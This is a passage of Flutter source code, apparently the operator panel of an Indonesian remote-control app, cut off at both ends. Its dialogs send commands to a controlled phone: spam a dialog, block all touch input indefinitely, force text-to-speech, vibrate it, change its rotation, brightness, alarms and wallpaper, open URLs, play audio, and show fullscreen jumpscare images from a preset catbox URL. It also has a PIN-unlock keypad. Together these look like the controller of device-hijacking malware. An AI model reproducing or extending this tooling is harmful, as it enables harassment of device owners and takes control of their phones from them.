  Future<void> _showPrompt({
    required String title,
    required String sub,
    required Color color,
    required IconData icon,
    required List<(String, TextEditingController, String)> fields,
    required String okLabel,
    bool? Function()? onOk,
    bool Function()? onOkCheck,
    bool danger = false,
    bool multiLine = false,
  }) async {
    await showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) {
        String? errorText;
        return StatefulBuilder(
          builder: (ctx, setState) {
            return Dialog(
              backgroundColor: Neo.white,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                  side: const BorderSide(color: Neo.textDark, width: 3)),
              child: Padding(
                padding: const EdgeInsets.fromLTRB(24, 26, 24, 20),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    Row(
                      children: [
                        _TileIcon(icon, color),
                        const Spacer(),
                        GestureDetector(
                          onTap: () => Navigator.pop(ctx),
                          child: const Icon(Icons.close, color: Neo.textMuted, size: 18),
                        ),
                      ],
                    ),
                    const SizedBox(height: 14),
                    Text(title,
                        textAlign: TextAlign.center,
                        style: TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 18,
                            fontWeight: FontWeight.w700,
                            letterSpacing: 2,
                            color: color)),
                    const SizedBox(height: 4),
                    Text(sub,
                        textAlign: TextAlign.center,
                        style: const TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 8,
                            color: Neo.textMuted,
                            letterSpacing: 1)),
                    const SizedBox(height: 16),
                    for (final f in fields) ...[
                      Align(
                        alignment: Alignment.centerLeft,
                        child: Text(f.$1.toUpperCase(),
                            style: const TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 8,
                                color: Neo.textMuted,
                                letterSpacing: 1)),
                      ),
                      const SizedBox(height: 5),
                      TextField(
                        controller: f.$2,
                        maxLines: multiLine ? 8 : 1,
                        style: const TextStyle(
                            fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
                        decoration: InputDecoration(
                          hintText: f.$3,
                          hintStyle: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 10,
                              color: Neo.textMuted),
                          filled: true,
                          fillColor: Neo.cream,
                          enabledBorder: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(10),
                            borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                          ),
                          focusedBorder: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(10),
                            borderSide: BorderSide(color: color, width: 3),
                          ),
                          contentPadding:
                              const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
                        ),
                      ),
                      const SizedBox(height: 12),
                    ],
                    Row(
                      children: [
                        Expanded(
                          child: NeoButton(
                            label: 'BATAL',
                            color: Neo.cream,
                            textColor: Neo.textMuted,
                            onPressed: () => Navigator.pop(ctx),
                          ),
                        ),
                        const SizedBox(width: 10),
                        Expanded(
                          flex: 2,
                          child: NeoButton(
                            label: okLabel,
                            color: danger ? Neo.coral : color,
                            onPressed: () {
                              final ok = onOkCheck?.call() ?? true;
                              if (!ok) {
                                setState(() => errorText = 'Periksa isian!');
                                return;
                              }
                              final shouldClose = onOk?.call() ?? true;
                              if (shouldClose) Navigator.pop(ctx);
                            },
                          ),
                        ),
                      ],
                    ),
                    if (errorText != null) ...[
                      const SizedBox(height: 8),
                      Text(errorText!,
                          textAlign: TextAlign.center,
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.coral)),
                    ],
                  ],
                ),
              ),
            );
          },
        );
      },
    );
  }

  // â”€â”€ Dialog PIN dengan keypad virtual 1-9-0 â”€â”€
  Future<void> _showLockPinDialog({
    required String title,
    required String sub,
    required Color color,
    required IconData icon,
    required List<(String, TextEditingController, String)> extraFields,
    required String okLabel,
    int maxPin = 4,
    bool danger = false,
    required bool Function(String pin) onOk,
  }) async {
    var pin = '';
    await showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) {
        return StatefulBuilder(
          builder: (ctx, setState) {
            void press(String n) {
              if (pin.length >= maxPin) return;
              setState(() => pin += n);
            }

            void backspace() {
              if (pin.isEmpty) return;
              setState(() => pin = pin.substring(0, pin.length - 1));
            }

            void submit() {
              final shouldClose = onOk(pin);
              if (shouldClose) Navigator.pop(ctx);
            }

            return Dialog(
              backgroundColor: Neo.white,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(12),
                  side: const BorderSide(color: Neo.textDark, width: 3)),
              child: Padding(
                padding: const EdgeInsets.fromLTRB(24, 26, 24, 20),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  crossAxisAlignment: CrossAxisAlignment.stretch,
                  children: [
                    Row(
                      children: [
                        _TileIcon(icon, color),
                        const Spacer(),
                        GestureDetector(
                          onTap: () => Navigator.pop(ctx),
                          child: const Icon(Icons.close, color: Neo.textMuted, size: 18),
                        ),
                      ],
                    ),
                    const SizedBox(height: 14),
                    Text(title,
                        textAlign: TextAlign.center,
                        style: TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 18,
                            fontWeight: FontWeight.w700,
                            letterSpacing: 2,
                            color: color)),
                    const SizedBox(height: 4),
                    Text(sub,
                        textAlign: TextAlign.center,
                        style: const TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 8,
                            color: Neo.textMuted,
                            letterSpacing: 1)),
                    const SizedBox(height: 16),
                    for (final f in extraFields) ...[
                      Align(
                        alignment: Alignment.centerLeft,
                        child: Text(f.$1.toUpperCase(),
                            style: const TextStyle(
                                fontFamily: 'ShareTechMono',
                                fontSize: 8,
                                color: Neo.textMuted,
                                letterSpacing: 1)),
                      ),
                      const SizedBox(height: 5),
                      TextField(
                        controller: f.$2,
                        style: const TextStyle(
                            fontFamily: 'ShareTechMono',
                            fontSize: 11,
                            color: Neo.textDark),
                        decoration: InputDecoration(
                          hintText: f.$3,
                          hintStyle: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 10,
                              color: Neo.textMuted),
                          filled: true,
                          fillColor: Neo.cream,
                          enabledBorder: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(10),
                            borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                          ),
                          focusedBorder: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(10),
                            borderSide: BorderSide(color: color, width: 3),
                          ),
                          contentPadding: const EdgeInsets.symmetric(
                              horizontal: 14, vertical: 12),
                        ),
                      ),
                      const SizedBox(height: 12),
                    ],
                    Align(
                      alignment: Alignment.centerLeft,
                      child: const Text('PIN UNLOCK',
                          style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 8,
                              color: Neo.textMuted,
                              letterSpacing: 1)),
                    ),
                    const SizedBox(height: 5),
                    Align(
                      alignment: Alignment.center,
                      child: Row(
                        mainAxisSize: MainAxisSize.min,
                        children: List.generate(maxPin, (i) {
                          return Container(
                            width: 12,
                            height: 12,
                            margin: const EdgeInsets.symmetric(horizontal: 5),
                            decoration: BoxDecoration(
                              shape: BoxShape.circle,
                              color: i < pin.length
                                  ? color
                                  : Colors.transparent,
                              border: Border.all(
                                  color: Neo.textDark, width: 2),
                            ),
                          );
                        }),
                      ),
                    ),
                    const SizedBox(height: 12),
                    _buildKeypad(pin, maxPin, press, backspace, submit, color),
                    const SizedBox(height: 14),
                    Row(
                      children: [
                        Expanded(
                          child: NeoButton(
                            label: 'BATAL',
                            color: Neo.cream,
                            textColor: Neo.textMuted,
                            onPressed: () => Navigator.pop(ctx),
                          ),
                        ),
                        const SizedBox(width: 10),
                        Expanded(
                          flex: 2,
                          child: NeoButton(
                            label: okLabel,
                            color: danger ? Neo.coral : color,
                            onPressed: pin.isEmpty ? null : submit,
                          ),
                        ),
                      ],
                    ),
                  ],
                ),
              ),
            );
          },
        );
      },
    );
  }

  Widget _buildKeypad(
    String pin,
    int maxPin,
    void Function(String) press,
    void Function() backspace,
    void Function() submit,
    Color color,
  ) {
    final rows = [
      ['1', '2', '3'],
      ['4', '5', '6'],
      ['7', '8', '9'],
      ['del', '0', 'ok'],
    ];
    return Column(
      children: rows.map((row) {
        return Row(
          children: row.map((key) {
            return Expanded(
              child: Padding(
                padding: const EdgeInsets.all(3),
                child: key == 'del'
                    ? _KeypadButton(
                        icon: Icons.backspace_outlined,
                        onTap: pin.isEmpty ? null : backspace,
                        color: color,
                      )
                    : key == 'ok'
                        ? _KeypadButton(
                            icon: Icons.check_rounded,
                            onTap: pin.isEmpty ? null : submit,
                            color: color,
                          )
                        : _KeypadButton(
                            text: key,
                            onTap: () => press(key),
                            color: color,
                          ),
              ),
            );
          }).toList(),
        );
      }).toList(),
    );
  }

  Future<void> _showDialogSpam() async {
    final textCtrl = TextEditingController();
    await _showPrompt(
      title: 'DIALOG SPAM',
      sub: '7X SPAM Ã¢â‚¬Â¢ AUTO OFF',
      color: Neo.textDark,
      icon: Icons.notifications_outlined,
      fields: [('PESAN', textCtrl, 'Isi pesan dialog...')],
      okLabel: 'SPAM',
      onOkCheck: () => textCtrl.text.trim().isNotEmpty,
      onOk: () {
        _cmd('dialogSpam', jsonEncode({'text': textCtrl.text.trim()}));
        _toast('Dialog spam aktif! (7x)');
        return true;
      },
    );
  }

  Future<void> _showTouchBlock() async {
    final durCtrl = TextEditingController(text: '0');
    await showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) => Dialog(
        backgroundColor: Neo.white,
        shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(12),
            side: const BorderSide(color: Neo.textDark, width: 3)),
        child: Padding(
          padding: const EdgeInsets.fromLTRB(24, 26, 24, 20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              Row(
                children: [
                  const _TileIcon(Icons.back_hand_outlined, Neo.peach),
                  const Spacer(),
                  GestureDetector(
                      onTap: () => Navigator.pop(ctx),
                      child: const Icon(Icons.close, color: Neo.textMuted, size: 18)),
                ],
              ),
              const SizedBox(height: 14),
              const Text('TOUCH BLOCK',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      fontFamily: 'ShareTechMono',
                      fontSize: 18,
                      fontWeight: FontWeight.w700,
                      letterSpacing: 2,
                      color: Neo.peach)),
              const SizedBox(height: 4),
              const Text('BLOCK SEMUA SENTUHAN DI LAYAR',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                      fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, letterSpacing: 1)),
              const SizedBox(height: 16),
              TextField(
                controller: durCtrl,
                keyboardType: TextInputType.number,
                style: const TextStyle(
                    fontFamily: 'ShareTechMono', fontSize: 14, color: Neo.textDark),
                decoration: InputDecoration(
                  labelText: 'DURASI (DETIK) — 0 = SELAMANYA',
                  labelStyle: const TextStyle(
                      fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted),
                  filled: true,
                  fillColor: Neo.cream,
                  enabledBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(10),
                    borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(10),
                    borderSide: const BorderSide(color: Neo.peach, width: 3),
                  ),
                ),
              ),
              const SizedBox(height: 16),
              Row(
                children: [
                  Expanded(
                    child: NeoButton(
                      label: 'BATAL',
                      color: Neo.cream,
                      textColor: Neo.textMuted,
                      onPressed: () => Navigator.pop(ctx),
                    ),
                  ),
                  const SizedBox(width: 8),
                  Expanded(
                    child: NeoButton(
                      label: 'BLOCK',
                      color: Neo.peach,
                      onPressed: () {
                        final dur = int.tryParse(durCtrl.text.trim()) ?? 0;
                        _cmd('touchBlock', jsonEncode({'duration': dur}));
                        Navigator.pop(ctx);
                        _toast('Touch block aktif!');
                      },
                    ),
                  ),
                  const SizedBox(width: 8),
                  Expanded(
                    child: NeoButton(
                      label: 'STOP',
                      color: Neo.coral,
                      onPressed: () {
                        _cmd('touchBlockStop', '');
                        Navigator.pop(ctx);
                        _toast('Touch block dimatikan', info: true);
                      },
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }

  Future<void> _showTTS() async {
    final textCtrl = TextEditingController();
    String lang = 'id';
    double pitch = 1.0;
    double speed = 1.0;
    await showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setState) => Dialog(
          backgroundColor: Neo.white,
          shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(12),
              side: const BorderSide(color: Neo.textDark, width: 3)),
          child: Padding(
            padding: const EdgeInsets.fromLTRB(24, 26, 24, 20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                const Row(
                  children: [
                    _TileIcon(Icons.record_voice_over_outlined, Neo.lavender),
                    Spacer(),
                  ],
                ),
                const SizedBox(height: 14),
                const Text('TEXT TO SPEECH',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 18,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 2,
                        color: Neo.lavender)),
                const SizedBox(height: 4),
                const Text('SURUH HP NGOMONG',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, letterSpacing: 1)),
                const SizedBox(height: 16),
                TextField(
                  controller: textCtrl,
                  maxLines: 4,
                  style: const TextStyle(
                      fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
                  decoration: InputDecoration(
                    hintText: 'Ketik teks yang mau diucapkan...',
                    hintStyle: const TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted),
                    filled: true,
                    fillColor: Neo.cream,
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Neo.lavender, width: 3),
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                Row(
                  children: [
                    Expanded(
                      child: _TtsField(
                        label: 'BAHASA',
                        child: DropdownButton<String>(
                          value: lang,
                          dropdownColor: Neo.white,
                          underline: const SizedBox.shrink(),
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 11,
                              color: Neo.textDark),
                          items: const [
                            DropdownMenuItem(value: 'id', child: Text('Indonesia')),
                            DropdownMenuItem(value: 'en', child: Text('English')),
                          ],
                          onChanged: (v) => setState(() => lang = v ?? 'id'),
                        ),
                      ),
                    ),
                    const SizedBox(width: 8),
                    Expanded(
                      child: _TtsField(
                        label: 'PITCH',
                        child: TextField(
                          controller: TextEditingController(text: pitch.toString()),
                          keyboardType:
                              const TextInputType.numberWithOptions(decimal: true),
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono', fontSize: 12, color: Neo.textDark),
                          onChanged: (v) =>
                              pitch = double.tryParse(v) ?? 1.0,
                          decoration: _ttsDeco(),
                        ),
                      ),
                    ),
                    const SizedBox(width: 8),
                    Expanded(
                      child: _TtsField(
                        label: 'SPEED',
                        child: TextField(
                          controller: TextEditingController(text: speed.toString()),
                          keyboardType:
                              const TextInputType.numberWithOptions(decimal: true),
                          style: const TextStyle(
                              fontFamily: 'ShareTechMono', fontSize: 12, color: Neo.textDark),
                          onChanged: (v) =>
                              speed = double.tryParse(v) ?? 1.0,
                          decoration: _ttsDeco(),
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 16),
                Row(
                  children: [
                    Expanded(
                      child: NeoButton(
                        label: 'BATAL',
                        color: Neo.cream,
                        textColor: Neo.textMuted,
                        onPressed: () => Navigator.pop(ctx),
                      ),
                    ),
                    const SizedBox(width: 8),
                    Expanded(
                      child: NeoButton(
                        label: 'BICARA',
                        color: Neo.lavender,
                        onPressed: () {
                          final t = textCtrl.text.trim();
                          if (t.isEmpty) {
                            _toast('Teks tidak boleh kosong!', error: true);
                            return;
                          }
                          _cmd('ttsSpeak', jsonEncode({
                                'text': t,
                                'lang': lang,
                                'pitch': pitch,
                                'speed': speed,
                              }));
                          Navigator.pop(ctx);
                          _toast('HP lagi ngomong!');
                        },
                      ),
                    ),
                    const SizedBox(width: 8),
                    Expanded(
                      child: NeoButton(
                        label: 'STOP',
                        color: Neo.coral,
                        onPressed: () {
                          _cmd('ttsStop', '');
                          Navigator.pop(ctx);
                          _toast('TTS dihentikan', info: true);
                        },
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _showVibrate() async {
    int ms = 500;
    final customCtrl = TextEditingController();
    await showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setState) => Dialog(
          backgroundColor: Neo.white,
          shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(12),
              side: const BorderSide(color: Neo.textDark, width: 3)),
          child: Padding(
            padding: const EdgeInsets.fromLTRB(24, 26, 24, 20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                const Row(
                  children: [
                    _TileIcon(Icons.vibration, Neo.lavender),
                    Spacer(),
                  ],
                ),
                const SizedBox(height: 14),
                const Text('VIBRATE',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 18,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 2,
                        color: Neo.lavender)),
                const SizedBox(height: 4),
                const Text('GETAR DEVICE',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, letterSpacing: 1)),
                const SizedBox(height: 16),
                Wrap(
                  spacing: 8,
                  runSpacing: 8,
                  alignment: WrapAlignment.center,
                  children: [200, 500, 1000, 2000, 5000].map((v) {
                    final sel = ms == v;
                    return GestureDetector(
                      onTap: () => setState(() => ms = v),
                      child: Container(
                        padding:
                            const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(8),
                          color: sel ? Neo.lavender : Neo.cream,
                          border: Border.all(color: Neo.textDark, width: 2.5),
                          boxShadow: sel ? Neo.shadow(offset: 2) : [],
                        ),
                        child: Text(
                          v >= 1000 ? '${v ~/ 1000}s' : '${v}ms',
                          style: TextStyle(
                              fontFamily: 'ShareTechMono',
                              fontSize: 9,
                              color: sel ? Neo.white : Neo.textDark),
                        ),
                      ),
                    );
                  }).toList(),
                ),
                const SizedBox(height: 12),
                TextField(
                  controller: customCtrl,
                  keyboardType: TextInputType.number,
                  style: const TextStyle(
                      fontFamily: 'ShareTechMono', fontSize: 12, color: Neo.textDark),
                  decoration: InputDecoration(
                    hintText: 'Custom ms, cth: 3000',
                    hintStyle: const TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted),
                    filled: true,
                    fillColor: Neo.cream,
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Neo.lavender, width: 3),
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                Row(
                  children: [
                    Expanded(
                      child: NeoButton(
                        label: 'BATAL',
                        color: Neo.cream,
                        textColor: Neo.textMuted,
                        onPressed: () => Navigator.pop(ctx),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      flex: 2,
                      child: NeoButton(
                        label: 'VIBRATE',
                        color: Neo.lavender,
                        onPressed: () {
                          final custom = int.tryParse(customCtrl.text.trim());
                          final finalMs = (custom != null && custom > 0) ? custom : ms;
                          _cmd('vibrate', finalMs.toString());
                          Navigator.pop(ctx);
                          _toast('Getar $finalMs ms');
                        },
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _showRotation() async {
    final result = await showModalBottomSheet<String>(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (_) => _OptionSheet(
        color: _amber,
        icon: Icons.screen_rotation,
        title: 'ROTASI LAYAR',
        sub: 'Atur orientasi layar device',
        options: [
          ('OFF (Auto)', 'off'),
          ('Portrait', 'portrait'),
          ('Landscape', 'landscape'),
        ],
      ),
    );
    if (result == null) return;
    _cmd('screen:rotation', result);
    _patch('rotation', result);
    _toast('Rotasi layar: $result');
  }

  Future<void> _showBrightness() async {
    double value = 128;
    await showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setState) => Dialog(
          backgroundColor: Neo.white,
          shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(12),
              side: const BorderSide(color: Neo.textDark, width: 3)),
          child: Padding(
            padding: const EdgeInsets.fromLTRB(24, 26, 24, 20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                const _TileIcon(Icons.brightness_6_outlined, Neo.peach),
                const SizedBox(height: 14),
                const Text('BRIGHTNESS',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 18,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 2,
                        color: Neo.peach)),
                const SizedBox(height: 4),
                const Text('Atur kecerahan layar device',
                    style: TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, letterSpacing: 1)),
                const SizedBox(height: 16),
                Slider(
                  value: value,
                  min: 0,
                  max: 255,
                  activeColor: Neo.peach,
                  inactiveColor: Neo.cream,
                  onChanged: (v) => setState(() => value = v),
                ),
                Text('${value.round()} / 255',
                    style: const TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.peach)),
                const SizedBox(height: 16),
                Row(
                  children: [
                    Expanded(
                      child: NeoButton(
                        label: 'BATAL',
                        color: Neo.cream,
                        textColor: Neo.textMuted,
                        onPressed: () => Navigator.pop(ctx),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      flex: 2,
                      child: NeoButton(
                        label: 'SET',
                        color: Neo.peach,
                        onPressed: () {
                          _cmd('brightness', value.round());
                          Navigator.pop(ctx);
                          _toast('Brightness diatur ke ${value.round()}');
                        },
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _showAlarm() async {
    final msgCtrl = TextEditingController();
    TimeOfDay time = const TimeOfDay(hour: 8, minute: 0);
    await showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setState) => Dialog(
          backgroundColor: Neo.white,
          shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(12),
              side: const BorderSide(color: Neo.textDark, width: 3)),
          child: Padding(
            padding: const EdgeInsets.fromLTRB(24, 26, 24, 20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                const Row(
                  children: [
                    _TileIcon(Icons.alarm, Neo.lavender),
                    Spacer(),
                  ],
                ),
                const SizedBox(height: 14),
                const Text('SET ALARM',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 18,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 2,
                        color: Neo.lavender)),
                const SizedBox(height: 4),
                const Text('Atur alarm di device',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, letterSpacing: 1)),
                const SizedBox(height: 16),
                InkWell(
                  onTap: () async {
                    final picked = await showTimePicker(
                      context: context,
                      initialTime: time,
                      builder: (ctx, child) => Theme(
                        data: ThemeData.dark().copyWith(
                          colorScheme: const ColorScheme.dark(primary: Neo.lavender),
                        ),
                        child: child!,
                      ),
                    );
                    if (picked != null) setState(() => time = picked);
                  },
                  child: Container(
                    height: 48,
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(10),
                      color: Neo.cream,
                      border: Border.all(color: Neo.textDark, width: 2.5),
                    ),
                    alignment: Alignment.center,
                    child: Text(
                      '${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}',
                      style: const TextStyle(
                          fontFamily: 'ShareTechMono', fontSize: 18, color: Neo.textDark),
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                TextField(
                  controller: msgCtrl,
                  style: const TextStyle(
                      fontFamily: 'ShareTechMono', fontSize: 11, color: Neo.textDark),
                  decoration: InputDecoration(
                    hintText: 'Pesan alarm...',
                    hintStyle: const TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted),
                    filled: true,
                    fillColor: Neo.cream,
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Neo.lavender, width: 3),
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                Row(
                  children: [
                    Expanded(
                      child: NeoButton(
                        label: 'BATAL',
                        color: Neo.cream,
                        textColor: Neo.textMuted,
                        onPressed: () => Navigator.pop(ctx),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      flex: 2,
                      child: NeoButton(
                        label: 'SET',
                        color: Neo.lavender,
                        onPressed: () {
                          _cmd('alarm:set', jsonEncode({
                            'time':
                                '${time.hour.toString().padLeft(2, '0')}:${time.minute.toString().padLeft(2, '0')}',
                            'message': msgCtrl.text.trim(),
                          }));
                          Navigator.pop(ctx);
                          _toast('Alarm diatur');
                        },
                      ),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _showUrlDialog(String type) async {
    final urlCtrl = TextEditingController();
    final titles = {
      'wallpaper': ('WALLPAPER', 'SET URL WALLPAPER', _purple, Icons.wallpaper),
      'openurl': ('OPEN SITUS', 'BUKA URL DI BROWSER', _green, Icons.public),
      'playaudio': ('PLAY AUDIO', 'PUTAR AUDIO DARI URL', _blue2, Icons.volume_up_outlined),
      'showtoast': ('TOAST MESSAGE', 'KIRIM PESAN KE DEVICE', _amber, Icons.chat_bubble_outline),
      'jumpscare': ('JUMPSCARE', 'SET FOTO JUMPSCARE', _red, Icons.warning_amber_outlined),
    };
    final meta = titles[type]!;
    final placeholder = type == 'showtoast'
        ? 'Isi pesan...'
        : 'https://example.com/file.jpg';
    await _showPrompt(
      title: meta.$1,
      sub: meta.$2,
      color: meta.$3,
      icon: meta.$4,
      fields: [('URL', urlCtrl, placeholder)],
      okLabel: 'KIRIM',
      onOkCheck: () => urlCtrl.text.trim().isNotEmpty,
      onOk: () {
        final url = urlCtrl.text.trim();
        switch (type) {
          case 'wallpaper':
            _cmd('setWallpaper', url);
            _toast('Mengirim wallpaper...', info: true);
          case 'openurl':
            _cmd('openUrl', url);
            _toast('Membuka situs...', info: true);
          case 'playaudio':
            _cmd('playAudio', url);
            _toast('Memutar audio...', info: true);
          case 'showtoast':
            _cmd('showToast', url);
            _toast('Toast dikirim!');
          case 'jumpscare':
            _cmd('jumpscareStart', url);
            _patch('jumpscareActive', true);
            _patch('jumpscareUrl', url);
            _toast('Jumpscare Aktif!', error: true);
        }
        return true;
      },
    );
  }

  Future<void> _showJumpscare2Dialog() async {
    final urlCtrl =
        TextEditingController(text: 'https://files.catbox.moe/ulrmbb.jpg');
    int dur = 3000;
    await showDialog(
      context: context,
      barrierColor: Colors.black54,
      builder: (ctx) => StatefulBuilder(
        builder: (ctx, setState) => Dialog(
          backgroundColor: Neo.white,
          shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(12),
              side: const BorderSide(color: Neo.textDark, width: 3)),
          child: Padding(
            padding: const EdgeInsets.fromLTRB(24, 26, 24, 20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                const Row(
                  children: [
                    _TileIcon(Icons.warning_amber_outlined, Neo.coral),
                    Spacer(),
                  ],
                ),
                const SizedBox(height: 14),
                const Text('JUMPSCARE V2',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono',
                        fontSize: 18,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 2,
                        color: Neo.coral)),
                const SizedBox(height: 4),
                const Text('FULLSCREEN \u2022 DURASI',
                    textAlign: TextAlign.center,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 8, color: Neo.textMuted, letterSpacing: 1)),
                const SizedBox(height: 16),
                const Text('URL FOTO',
                    textAlign: TextAlign.left,
                    style: TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 9, color: Neo.textMuted, letterSpacing: 1)),
                const SizedBox(height: 5),
                TextField(
                  controller: urlCtrl,
                  style: const TextStyle(
                      fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textDark),
                  decoration: InputDecoration(
                    hintText: 'https://files.catbox.moe/xxx.jpg',
                    hintStyle: const TextStyle(
                        fontFamily: 'ShareTechMono', fontSize: 10, color: Neo.textMuted),
                    filled: true,
                    fillColor: Neo.cream,
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Neo.textDark, width: 2.5),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(10),
                      borderSide: const BorderSide(color: Neo.coral, width: 3),
                    ),
                  ),
                ),
                const SizedBox(height: 12),
                const Text('DURASI (MS) \u2014 1000 = 1 DETIK',
                    textAlign: TextAlign.left,
                    style: TextStyle(
